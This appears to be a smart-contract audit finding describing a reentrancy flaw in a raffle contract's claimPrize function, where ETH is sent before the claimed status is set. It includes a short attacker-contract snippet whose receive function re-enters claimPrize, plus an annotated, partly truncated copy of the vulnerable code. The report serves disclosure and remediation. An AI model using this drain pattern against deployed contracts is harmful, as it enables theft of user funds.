# Reentrancy attack in WinnablesPrizeManager::claimPrize()

## Summary

The claimPrize function in the WinnablesPrizeManager is vulnerable to a reentrancy attack in the case of an ETH raffle. The vulnerability allows an attacker to repeatedly call the claimPrize function before the contract updates the RafflePrizeStatus.CLAIMED, potentially leading to the unauthorized withdrawal of funds.

## Vulnerability Detail

The vulnerability arises because the claimPrize function calls _sendETHPrize, which transfers ETH to the caller using call{value: amount}. This external call allows the recipient (an attacker contract) to re-enter the claimPrize function before the state variables RafflePrizeStatus.CLAIMED is updated. As a result, an attacker can repeatedly claim the prize and drain the contract's funds.

The key issues are:

The ETH transfer occurs before the state variables are updated to reflect that the prize has been claimed.
An attacker can exploit this by deploying a malicious contract with a receive function that calls claimPrize again, recursively withdrawing ETH.

## Impact

If exploited, the attacker can drain the contract of its ETH balance, causing significant financial loss. The impact is high, as the contract's entire ETH balance can be stolen through this reentrancy attack.

## Code Snippet

Let's say that we have two ETH raffles: 
       Raffle A:
       The amount of eth locked is = _ethRaffles[raffleId] = 10ETH
        The winner is the address: 0x001
            unchecked { _ethLocked -= _ethRaffles[raffleId]; } 
       Raffle B:
       The amount of eth locked is = _ethRaffles[raffleId] = 12ETH
        The winner is the address: 0x002

noticing that the amount of _ethRaffles[raffleId] is being deducted from _ethLocked which contains in this case 22ETH
let's say the the winner of the raffle A is a malicious contract and he call the claimPrize function

0x001 contract :

    // Function to attack the raffle contract
    function attack(uint256 raffleId) external {
        targetRaffleId = raffleId;
        raffleContract.claimPrize(raffleId);
    }

   // Receive function to trigger reentrancy when plain ETH is sent
    receive() external payable {
        if (address(raffleContract).balance > 0) {
            raffleContract.claimPrize(targetRaffleId);
        }

here is a the flow of the values of the function claimPrize
```
function claimPrize(uint256 raffleId) external {
        RafflePrize storage rafflePrize = _rafflePrize[raffleId]; ==> raffle A
        RaffleType raffleType = rafflePrize.raffleType; ==> raflleType ==> ETH
        
        if (raffleType == RaffleType.NFT) { 
            NFTInfo storage raffle = _nftRaffles[raffleId];
            _nftLocked[raffle.contractAddress][raffle.tokenId] = false;
            _sendNFTPrize(raffle.contractAddress, raffle.tokenId, msg.sender);
        } 
        else if (raffleType == RaffleType.TOKEN) {
            TokenInfo storage raffle = _tokenRaffles[raffleId];
            unchecked { _tokensLocked[raffle.tokenAddress] -= raffle.amount; }
            _sendTokenPrize(raffle.tokenAddress, raffle.amount, msg.sender);
        } 
        else if (raffleType == RaffleType.ETH) { ==> True
            unchecked { _ethLocked -= _ethRaffles[raffleId]; } ==> 22 - 10 = 12
            _sendETHPrize(_ethRaffles[raffleId], msg.sender); ==> the function _sendETHPrize described below will send the ETH to the contract
            when receiving the eth, the contract will another time the claimePrize and be able to withraw another 10eth from the contract 
        } 
        else revert InvalidRaffle();
        if (msg.sender != rafflePrize.winner) revert UnauthorizedToClaim();
        if (rafflePrize.status == RafflePrizeStatus.CLAIMED) revert AlreadyClaimed();
        rafflePrize.status = RafflePrizeStatus.CLAIMED;
        emit PrizeClaimed(raffleId, msg.sender);
    }
  function _sendETHPrize(uint256 amount, address winner) internal {

## Recommendation
Implement a reentrancy guard (e.g., using OpenZeppelin's ReentrancyGuard modifier) to prevent reentrant calls to the claimPrize function.
